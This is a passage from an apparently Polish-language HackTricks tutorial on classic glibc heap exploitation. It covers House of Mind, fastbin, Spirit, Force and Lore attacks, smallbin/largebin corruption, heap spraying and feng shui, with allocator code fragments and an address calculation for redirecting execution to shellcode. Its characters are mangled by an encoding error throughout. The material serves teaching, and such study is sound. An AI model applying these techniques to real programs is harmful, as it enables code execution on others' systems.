W miejscu, gdzie znajdzie siÄ™ adres drugiego kawaÅ‚ka z ostatnimi 5 zerami, musimy zapisaÄ‡ adres tego pierwszego kawaÅ‚ka, aby heap\_for\_ptr() myÅ›laÅ‚, Å¼e ar\_ptr zaczyna siÄ™ na poczÄ…tku pierwszego kawaÅ‚ka i wyciÄ…gnÄ…Å‚ z niego av->bins\[2]

W drugim kawaÅ‚ku, dziÄ™ki pierwszemu, nadpisujemy prev\_size skokiem 0x0c i rozmiarem czegoÅ›, aby aktywowaÄ‡ -> NON\_MAIN\_ARENA

NastÄ™pnie w kawaÅ‚ku 2 umieszczamy mnÃ³stwo nops i na koÅ„cu shellcode

W ten sposÃ³b zostanie wywoÅ‚ane \_int\_free(KAWAÅEK1, KAWAÅEK2) i bÄ™dzie postÄ™powaÄ‡ zgodnie z instrukcjami, aby zapisaÄ‡ w \_\_DTOR\_END\_\_ adres prev\_size KAWAÅKA2, ktÃ³ry skoczy do shellcode.

Aby zastosowaÄ‡ tÄ™ technikÄ™, naleÅ¼y speÅ‚niÄ‡ kilka dodatkowych wymagaÅ„, co trochÄ™ komplikuje payload.
Ta technika nie jest juÅ¼ stosowana, poniewaÅ¼ zostaÅ‚ zastosowany prawie ten sam patch co dla unlink. Sprawdzane jest, czy nowa lokalizacja, do ktÃ³rej siÄ™ odwoÅ‚uje, rÃ³wnieÅ¼ odwoÅ‚uje siÄ™ do niej.

**Fastbin**

To wariant The House of Mind

Interesuje nas wykonanie nastÄ™pujÄ…cego kodu, do ktÃ³rego dochodzi po pierwszej weryfikacji funkcji \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] â€”> Gdzie fastbin\_index(sz) â€”> (sz >> 3) - 2

â€¦

p->fd = \*fb

\*fb = p

W ten sposÃ³b, jeÅ›li umieÅ›cimy w "fb" adres funkcji w GOT, pod tym adresem umieszczony zostanie adres nadpisanej czÄ™Å›ci. Aby to osiÄ…gnÄ…Ä‡, konieczne jest, aby arena byÅ‚a blisko adresÃ³w dtors. DokÅ‚adniej mÃ³wiÄ…c, av->max\_fast musi znajdowaÄ‡ siÄ™ pod adresem, ktÃ³ry zamierzamy nadpisaÄ‡.

PoniewaÅ¼ w The House of Mind zauwaÅ¼ono, Å¼e kontrolowaliÅ›my pozycjÄ™ av.

JeÅ›li wiÄ™c w polu size podamy rozmiar 8 + NON\_MAIN\_ARENA + PREV\_INUSE â€”> fastbin\_index() zwrÃ³ci fastbins\[-1\], ktÃ³ry wskaÅ¼e na av->max\_fast

W tym przypadku av->max\_fast bÄ™dzie adresem, ktÃ³ry zostanie nadpisany (nie ten, do ktÃ³rego wskazuje, ale ta pozycja zostanie nadpisana).

Ponadto musi byÄ‡ speÅ‚niony warunek, Å¼e fragment obok zwolnionego musi byÄ‡ wiÄ™kszy niÅ¼ 8 -> PoniewaÅ¼ powiedzieliÅ›my, Å¼e rozmiar zwolnionego fragmentu to 8, w tym faÅ‚szywym fragmencie wystarczy umieÅ›ciÄ‡ rozmiar wiÄ™kszy niÅ¼ 8 (poniewaÅ¼ shellcode bÄ™dzie w zwolnionym fragmencie, na poczÄ…tku trzeba umieÅ›ciÄ‡ skok, ktÃ³ry trafi w nopy).

Ponadto ten sam faÅ‚szywy fragment musi byÄ‡ mniejszy niÅ¼ av->system\_mem. av->system\_mem znajduje siÄ™ 1848 bajtÃ³w dalej.

Z powodu zer w \_DTOR\_END\_ i niewielu adresÃ³w w GOT, Å¼aden z tych sektorÃ³w nie nadaje siÄ™ do nadpisania, zobaczmy wiÄ™c, jak zastosowaÄ‡ fastbin do ataku na stos.

Innym sposobem ataku jest przekierowanie **av** na stos.

JeÅ›li zmienimy rozmiar na 16 zamiast 8, wtedy: fastbin\_index() zwrÃ³ci fastbins\[0\] i moÅ¼emy tego uÅ¼yÄ‡ do nadpisania stosu.

W tym celu nie powinno byÄ‡ Å¼adnych canary ani dziwnych wartoÅ›ci na stosie, faktycznie musimy znaleÅºÄ‡ siÄ™ w takim miejscu: 4 bajty zerowe + EBP + RET

4 bajty zerowe sÄ… potrzebne, aby **av** znajdowaÅ‚ siÄ™ pod tym adresem, a pierwszy element **av** to mutex, ktÃ³ry musi wynosiÄ‡ 0.

**av->max\_fast** bÄ™dzie EBP i bÄ™dzie wartoÅ›ciÄ…, ktÃ³ra pozwoli nam ominÄ…Ä‡ ograniczenia.

W **av->fastbins\[0\]** zostanie nadpisany adresem **p** i bÄ™dzie RET, dziÄ™ki czemu nastÄ…pi skok do shellcode.

Ponadto w **av->system\_mem** (1484 bajty powyÅ¼ej pozycji na stosie) bÄ™dzie duÅ¼o Å›mieci, ktÃ³re pozwolÄ… nam ominÄ…Ä‡ sprawdzanie.

Ponadto musi byÄ‡ speÅ‚niony warunek, Å¼e fragment obok zwolnionego musi byÄ‡ wiÄ™kszy niÅ¼ 8 -> PoniewaÅ¼ powiedzieliÅ›my, Å¼e rozmiar zwolnionego fragmentu to 16, w tym faÅ‚szywym fragmencie wystarczy umieÅ›ciÄ‡ rozmiar wiÄ™kszy niÅ¼ 8 (poniewaÅ¼ shellcode bÄ™dzie w zwolnionym fragmencie, na poczÄ…tku trzeba umieÅ›ciÄ‡ skok, ktÃ³ry trafi w nopy, ktÃ³re znajdujÄ… siÄ™ po polu size nowego faÅ‚szywego fragmentu).

**The House of Spirit**

W tym przypadku chcemy mieÄ‡ wskaÅºnik do malloc, ktÃ³ry moÅ¼e byÄ‡ modyfikowany przez atakujÄ…cego (np. wskaÅºnik znajduje siÄ™ na stosie pod potencjalnym przepeÅ‚nieniem zmiennej).

W ten sposÃ³b moÅ¼emy sprawiÄ‡, Å¼e ten wskaÅºnik wskazuje dokÄ…dkolwiek. Jednak nie kaÅ¼de miejsce jest odpowiednie, rozmiar faÅ‚szywego fragmentu musi byÄ‡ mniejszy niÅ¼ av->max\_fast i bardziej konkretne, rÃ³wny rozmiarowi Å¼Ä…danemu w przyszÅ‚ym wywoÅ‚aniu malloc()+8. Dlatego jeÅ›li wiemy, Å¼e po tym podatnym wskaÅºniku nastÄ™puje wywoÅ‚anie malloc(40), rozmiar faÅ‚szywego fragmentu musi wynosiÄ‡ 48.

Na przykÅ‚ad, jeÅ›li program pyta uÅ¼ytkownika o liczbÄ™, moÅ¼emy wprowadziÄ‡ 48 i skierowaÄ‡ modyfikowalny wskaÅºnik malloc na nastÄ™pne 4 bajty (ktÃ³re mogÄ… naleÅ¼eÄ‡ do EBP, a wiÄ™c 48 pozostaje z tyÅ‚u, jakby to byÅ‚a nagÅ‚Ã³wek rozmiaru). Ponadto, adres ptr-4+48 musi speÅ‚niaÄ‡ kilka warunkÃ³w (w tym przypadku ptr=EBP), czyli 8 < ptr-4+48 < av->system\_mem.

JeÅ›li to siÄ™ speÅ‚ni, gdy zostanie wywoÅ‚any kolejny malloc, ktÃ³ry powiedzieliÅ›my, Å¼e to malloc(40), zostanie mu przypisany adres EBP. JeÅ›li atakujÄ…cy moÅ¼e rÃ³wnieÅ¼ kontrolowaÄ‡ to, co jest zapisywane w tym malloc, moÅ¼e nadpisaÄ‡ zarÃ³wno EBP, jak i EIP dowolnym adresem.

WyglÄ…da na to, Å¼e dlatego, gdy zostanie zwolniony free(), zostanie zapisane, Å¼e w miejscu wskazujÄ…cym na EBP stosu znajduje siÄ™ fragment o idealnym rozmiarze dla nowego malloc(), ktÃ³ry chce zarezerwowaÄ‡, wiÄ™c przypisuje mu ten adres.

**The House of Force**

Wymagane jest:

* PrzepeÅ‚nienie fragmentu, ktÃ³re pozwala na nadpisanie wilderness
* WywoÅ‚anie malloc() z rozmiarem zdefiniowanym przez uÅ¼ytkownika
* WywoÅ‚anie malloc(), ktÃ³rych dane mogÄ… byÄ‡ zdefiniowane przez uÅ¼ytkownika

Najpierw naleÅ¼y nadpisaÄ‡ rozmiar fragmentu wilderness bardzo duÅ¼Ä… wartoÅ›ciÄ… (0xffffffff), dziÄ™ki czemu kaÅ¼de Å¼Ä…danie pamiÄ™ci wystarczajÄ…co duÅ¼e bÄ™dzie obsÅ‚ugiwane w \_int\_malloc() bez koniecznoÅ›ci rozszerzania sterty.

NastÄ™pnie zmieniamy av->top, aby wskazywaÅ‚ na obszar pamiÄ™ci pod kontrolÄ… atakujÄ…cego, tak jak stos. W av->top umieszczamy \&EIP - 8.

Musimy nadpisaÄ‡ av->top, aby wskazywaÅ‚ na obszar pamiÄ™ci pod kontrolÄ… atakujÄ…cego:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim przechwytuje adres bieÅ¼Ä…cego obszaru wilderness (aktualny av->top), a remainder to dokÅ‚adnie suma tego adresu plus iloÅ›Ä‡ bajtÃ³w Å¼Ä…danych przez malloc(). Dlatego jeÅ›li \&EIP-8 znajduje siÄ™ pod adresem 0xbffff224, a av->top zawiera 0x080c2788, to iloÅ›Ä‡, ktÃ³rÄ… musimy zarezerwowaÄ‡ w kontrolowanym malloc, aby av->top wskazywaÅ‚ na $EIP-8 dla nastÄ™pnego malloc(), wynosi:

0xbffff224 - 0x080c2788 = 3086207644.

W ten sposÃ³b zostanie zapisana zmieniona wartoÅ›Ä‡ w av->top, a nastÄ™pny malloc wskaÅ¼e na EIP i bÄ™dzie moÅ¼na go nadpisaÄ‡.

WaÅ¼ne jest, aby rozmiar nowego obszaru wilderness byÅ‚ wiÄ™kszy niÅ¼ Å¼Ä…danie ostatniego malloc(). Innymi sÅ‚owy, jeÅ›li wilderness wskazuje na \&EIP-8, rozmiar zostanie dokÅ‚adnie w polu EBP stosu.

**The House of Lore**

**CorrupciÃ³n SmallBin**

Zwolnione fragmenty sÄ… umieszczane w bin w zaleÅ¼noÅ›ci od ich rozmiaru. Ale zanim zostanÄ… umieszczone, sÄ… przechowywane w nieuporzÄ…dkowanych binach. Fragment nie jest natychmiast umieszczany w swoim binie, ale pozostaje w nieuporzÄ…dkowanych binach. NastÄ™pnie, jeÅ›li zostanie zarezerwowany nowy fragment i poprzedni zwolniony moÅ¼e byÄ‡ uÅ¼yty, zostanie on zwrÃ³cony, ale jeÅ›li zostanie zarezerwowany wiÄ™kszy, zwolniony fragment w nieuporzÄ…dkowanych binach zostanie umieszczony w odpowiednim binie.

Aby osiÄ…gnÄ…Ä‡ podatny kod, Å¼Ä…danie pamiÄ™ci musi byÄ‡ wiÄ™ksze niÅ¼ av->max\_fast (zazwyczaj 72) i mniejsze niÅ¼ MIN\_LARGE\_SIZE (512).

JeÅ›li w binie znajduje siÄ™ fragment o odpowiednim rozmiarze, zostanie on zwrÃ³cony po odÅ‚Ä…czeniu:

bck = victim->bk; WskaÅ¼e poprzedni fragment, to jedyna informacja, ktÃ³rÄ… moÅ¼emy zmieniÄ‡.

bin->bk = bck; Przedostatni fragment staje siÄ™ ostatnim, jeÅ›li bck wskazuje na stos, nastÄ™pnemu zarezerwowanemu fragmentowi zostanie przypisany ten adres

bck->fd = bin; Lista zostaje zamkniÄ™ta, wskazujÄ…c na bin

Wymagane jest:
Zarezerwuj dwie pamiÄ™ci malloc, tak aby pierwsza mogÅ‚a zostaÄ‡ przepeÅ‚niona po zwolnieniu drugiej i umieszczeniu jej w swoim binie (czyli zarezerwowano malloc wiÄ™kszy niÅ¼ drugi kawaÅ‚ek przed przepeÅ‚nieniem).

Zarezerwowana pamiÄ™Ä‡, do ktÃ³rej atakujÄ…cy wybiera adres, jest kontrolowana przez atakujÄ…cego.

Celem jest, jeÅ›li moÅ¼emy przepeÅ‚niÄ‡ stertÄ™, ktÃ³ra ma zwolniony kawaÅ‚ek poniÅ¼ej i znajduje siÄ™ w jego binie, moÅ¼emy zmieniÄ‡ wskaÅºnik bk. JeÅ›li zmienimy wskaÅºnik bk i ten kawaÅ‚ek stanie siÄ™ pierwszy na liÅ›cie binÃ³w i zostanie zarezerwowany, oszukamy bin i powiemy mu, Å¼e nastÄ™pny kawaÅ‚ek na liÅ›cie (nastÄ™pny do zaoferowania) znajduje siÄ™ pod faÅ‚szywym adresem, ktÃ³ry podaliÅ›my (na przykÅ‚ad na stosie lub GOT). W ten sposÃ³b, jeÅ›li zostanie zarezerwowany kolejny kawaÅ‚ek i atakujÄ…cy ma uprawnienia do niego, zostanie mu przydzielony kawaÅ‚ek na Å¼Ä…danej pozycji i bÄ™dzie mÃ³gÅ‚ w niÄ… pisaÄ‡.

Po zwolnieniu zmodyfikowanego kawaÅ‚ka konieczne jest zarezerwowanie wiÄ™kszego kawaÅ‚ka niÅ¼ zwolniony, aby zmodyfikowany kawaÅ‚ek wyszedÅ‚ z nieuporzÄ…dkowanych binÃ³w i zostaÅ‚ umieszczony w swoim binie.

Gdy juÅ¼ znajdzie siÄ™ w swoim binie, naleÅ¼y zmieniÄ‡ mu wskaÅºnik bk poprzez przepeÅ‚nienie, aby wskazywaÅ‚ na adres, ktÃ³ry chcemy nadpisaÄ‡.

NastÄ™pnie bin musi poczekaÄ‡, aÅ¼ malloc() zostanie wywoÅ‚ane wystarczajÄ…co wiele razy, aby ponownie uÅ¼yÄ‡ zmodyfikowanego bina i oszukaÄ‡ bin, sprawiajÄ…c, Å¼e uwierzy, Å¼e nastÄ™pny kawaÅ‚ek znajduje siÄ™ pod faÅ‚szywym adresem. NastÄ™pnie zostanie przydzielony kawaÅ‚ek, ktÃ³ry nas interesuje.

Aby wywoÅ‚aÄ‡ podatnoÅ›Ä‡ jak najszybciej, idealne jest: zarezerwowanie podatnego kawaÅ‚ka, zarezerwowanie kawaÅ‚ka do zmodyfikowania, zwolnienie tego kawaÅ‚ka, zarezerwowanie wiÄ™kszego kawaÅ‚ka niÅ¼ ten, ktÃ³ry zostanie zmodyfikowany, zmodyfikowanie kawaÅ‚ka (podatnoÅ›Ä‡), zarezerwowanie kawaÅ‚ka o takim samym rozmiarze co naruszony i zarezerwowanie drugiego kawaÅ‚ka o takim samym rozmiarze, ktÃ³ry bÄ™dzie wskazywaÅ‚ na wybrany adres.

Aby zabezpieczyÄ‡ siÄ™ przed tym atakiem, uÅ¼ywa siÄ™ standardowej weryfikacji, czy kawaÅ‚ek "nie" jest faÅ‚szywy: sprawdza siÄ™, czy bck->fd wskazuje na ofiarÄ™. Innymi sÅ‚owy, w naszym przypadku, jeÅ›li wskaÅºnik fd\* faÅ‚szywego kawaÅ‚ka wskazuje na ofiarÄ™ na stosie. Aby ominÄ…Ä‡ to zabezpieczenie, atakujÄ…cy musiaÅ‚by byÄ‡ w stanie w jakiÅ› sposÃ³b (prawdopodobnie przez stos) zapisaÄ‡ odpowiednio adres ofiary. W ten sposÃ³b wyglÄ…daÅ‚oby to jak prawdziwy kawaÅ‚ek.

**Korupcja LargeBin**

Wymagane sÄ… te same warunki co wczeÅ›niej i kilka dodatkowych, ponadto zarezerwowane kawaÅ‚ki muszÄ… byÄ‡ wiÄ™ksze niÅ¼ 512.

Atak jest podobny do poprzedniego, czyli trzeba zmieniÄ‡ wskaÅºnik bk i potrzebne sÄ… wszystkie te wywoÅ‚ania malloc(), ale dodatkowo trzeba zmieniÄ‡ rozmiar zmodyfikowanego kawaÅ‚ka tak, aby ten rozmiar - nb byÅ‚ < MINSIZE.

Na przykÅ‚ad, trzeba ustawiÄ‡ rozmiar na 1552, aby 1552 - 1544 = 8 < MINSIZE (odejmowanie nie moÅ¼e byÄ‡ ujemne, poniewaÅ¼ porÃ³wnuje siÄ™ liczby bez znaku)

Dodatkowo wprowadzono Å‚atkÄ™, aby sprawiÄ‡, Å¼e atak bÄ™dzie jeszcze trudniejszy.

**Rozpylanie sterty (Heap Spraying)**

Polega na zarezerwowaniu jak najwiÄ™kszej iloÅ›ci pamiÄ™ci dla sterty i wypeÅ‚nieniu jej poduszkÄ… z nops zakoÅ„czonÄ… shellcodem. Dodatkowo jako poduszkÄ™ uÅ¼ywa siÄ™ 0x0c. NastÄ™pnie prÃ³buje siÄ™ skoczyÄ‡ do adresu 0x0c0c0c0c, wiÄ™c jeÅ›li jakaÅ› adres zostanie nadpisany tymi poduszkami, skoczy tam. PodstawowÄ… taktykÄ… jest zarezerwowanie jak najwiÄ™kszej iloÅ›ci pamiÄ™ci, aby zobaczyÄ‡, czy jakiÅ› wskaÅºnik zostanie nadpisany, i skok do 0x0c0c0c0c w nadziei, Å¼e tam bÄ™dÄ… nops.

**Feng Shui sterty (Heap Feng Shui)**

Polega na utwardzaniu pamiÄ™ci poprzez rezerwacje i zwalnianie, tak aby miÄ™dzy wolnymi kawaÅ‚kami pozostaÅ‚y zarezerwowane kawaÅ‚ki. Bufor do przepeÅ‚nienia zostanie umieszczony w jednym z tych kawaÅ‚kÃ³w.

## Ciekawe kursy

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Referencje**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
